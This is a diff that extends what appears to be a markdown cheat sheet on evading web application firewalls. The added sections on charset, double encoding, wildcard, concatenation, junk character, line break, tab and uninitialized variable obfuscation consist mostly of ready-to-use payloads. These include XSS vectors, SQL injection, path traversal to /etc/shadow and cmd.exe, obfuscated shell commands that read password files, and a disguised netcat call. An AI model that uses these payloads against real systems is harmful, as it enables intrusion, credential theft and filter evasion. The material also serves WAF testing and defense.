@@ -61,7 +61,7 @@ data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascri
 
 
 ## 3.Charset Encoding
-This technique involves modifying the Content-Type header to use a different charset (e.g. ibm500). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python
+This technique involves modifying the Content-Type header to use a different charset (e.g. ibm037). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python
 
 
 ```
@@ -78,7 +78,7 @@ print(urllib.parse.quote_plus(s.encode("IBM037")))
 ## Request example
 GET / HTTP/1.1
 Host: buggy
-Content-Type: application/x-www-form-urlencoded; charset=ibm500
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
 Content-Length: 61
 
 %86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
@@ -128,8 +128,269 @@ Bypassed Technique:
 * Encode entire or part of the payload for obtaining results.
 
 
+```
+<marquee onstart=prompt()>
+
+Obfuscated:
+
+<marquee onstart=\u0070r\u06f\u006dpt()>
+```
+
+```
+/?redir=http://google.com
+
+Bypassed Technique:
+
+/?redir=http://google。com (Unicode alternative)
+```
 
 
+```
+<marquee loop=1 onfinish=alert()>x
+
+Bypassed technique:
+
+＜marquee loop＝1 onfinish＝alert︵1)>x (Unicode alternative)
+```
+
+```
+../../etc/shadow
+
+Obfuscated:
+
+%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow
+```
+
+
+## 4. HTML Representation Technique
+* WebApps encode special characters into HTML. Encoding and render them accordingly.
+* Basic bypass cases with HTML encoding numeric and generic.
+
+```
+"><img src=x onerror=confirm()>
+
+Encoded Payload:
+
+&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;
+
+Encoded Payload:
+
+&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;
+```
+
+## 5. Mixed Encoding Technique
+* Such rules often tend to filter out a specific type of encoding.
+* Such filters can be bypassed by mixed encoding payloads.
+* Newlines and tabs and further add to obfuscation.
+
+```
+Obfuscate Payload:
+
+<A HREF="h
+tt p://6 6.000146.0x7.147/">XSS</A>
+```
+
+
+## 6. Using Comments Technique
+* Comments obfuscate standard payload vectors.
+* Different payloads have different ways of obfuscation.
+
+```
+<script>confirm()</script>
+
+Bypassed Technique:
+
+<!--><script>confirm/**/()/**/</script>
+```
+
+```
+/?id=1+union+select+1,2--
+
+Bypassed Technique:
+
+/?id=1+un/**/ion+sel/**/ect+1,2--
+```
+
+
+##  7. Double Encoding Technique
+* Web Application Firewall filters tend to encode characters to protect web app.
+* Poorly developed filters (without recursion filters) can be bypassed with double encoding.
+
+```
+<script>confirm()</script>
+
+Obfuscate Payload:
+
+%253Cscript%253Econfirm()%253C%252Fscript%253E
+```
+
+```
+http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\
+
+Obfuscate Payload:
+
+http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\
+```
+
+
+## 8. Wildcard Obfuscation Technique
+* Global patterns are used by various command-line utilities to work with multiple files.
+* We can change them to run system commands.
+
+```
+/bin/cat /etc/passwd
+
+Obfuscate Payload:
+
+/???/??t /???/??ss??
+```
+
+```
+/bin/nc 127.0.0.1 443
+
+Obfuscate Payload:
+
+/???/n? 2130706433 443
+```
+
+
+## 9. Dynamic Payload Generation Technique:
+* Programming languages have different patterns and syntaxes for concatenation.
+* This allows us to generate payloads that can bypass many filters and rules.
+
+```
+<script>confirm()</script>
+
+Obfuscate Payload:
+
+<script>eval('con'+'fi'+'rm()')</script>
+```
+
+```
+/bin/cat /etc/shadow
+
+Obfuscate Payload:
+
+/bi'n'''/c''at' /e'tc'/sh''ad'ow
+```
+
+
+```
+<iframe/onload='this["src"]="javascript:confirm()"';>
+
+Obfuscate Payload
+
+<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>
+```
+
+
+## 10. Junk Characters Technique
+* Simple payloads get filtered out easily by WAF.
+* Adding some junk chars helps avoid detection (only specific cases ).
+* This technique often helps in confusing regex-based firewalls.
+
+
+```
+<script>confirm()</script>
+
+Obfuscate Payload:
+
+<script>+-+-1-+-+confirm()</script>
+```
+
+
+```
+<a href=javascript;alert()>ClickMe
+
+Bypassed Technique:
+
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+```
+
+
+## 11. Line Breaks Technique
+* A lot of WAFs with regex-based filtering effectively blocks many attempts.
+* Line breaks technique (CR and LF) can break firewall regex and bypass stuff.
+
+```
+<iframe src=javascript:confirm(hacker)">
+
+Obfuscate Payload:
+
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">
+```
+
+## 12. Uninitialized Variables Technique
+* Wrong regular expression based filters can be evaded with uninitialized bash variables.
+* Such value equal to null and acts like empty strings.
+* Bash and perl allow such kind of interpretations.
+
+
+* First Level Obfuscation: Normal
+```
+/bin/cat /etc/shadow
+Obfuscate Payload:
+/bin/cat$u /etc/shadow$u
+```
+
+* Second Level Obfuscation: Position Based
+```
+/bin/cat /etc/shadow
+Obfuscate Payload:
+$u/bin$u/cat$u $u/etc$u/shadow$u
+```
+
+* Third Level Obfuscation: Random characters
+```
+/bin/cat /etc/passwd
+Obfuscate Payload:
+$aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff
+```
+
+
+## 13. Tabs and Line Feeds Technique
+* Tabs often help to evade firewalls, especially regex-based.
+* Tabs can help break WAF regex when the regex is expecting whitespaces and not tabs.
+
+```
+<IMG SRC="javascript:confirm();">
+
+Bypassed Technique:
+
+<IMG SRC=" javascript:confirm();">
+<IMG SRC=" jav ascri pt:confirm ();">
+```
+
+```
+<iframe src=javascript:confirm()></iframe>
+
+Obfuscate Payload:
+
+<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>
+```
+
+## 14. Obfuscation in Other Formats Technique
+* Many web applications support different encoding types and can interpret the encoding.
+* We always need to obfuscate the payload to a format not supported by WAF, but the server can smuggle our payload.
+* IIS 6, 7.5, 8, and 10 allow IBM037 character interpretations.
+* Send the encoded parameters with the query.
+
+
+```
+POST /example.aspx?id7=sometext HTTP/1.1
+HOST: target.org
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Content-Length: 27
+id2='union all select * from users--
+
+Obfuscated Request with URL Encoding:
+
+POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1
+HOST: target.org
+Content-Type: application/x-www-form-urlencoded; charset=ibm037
+Content-Length: 127
+%89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60
+```
 
 
 ## Tools
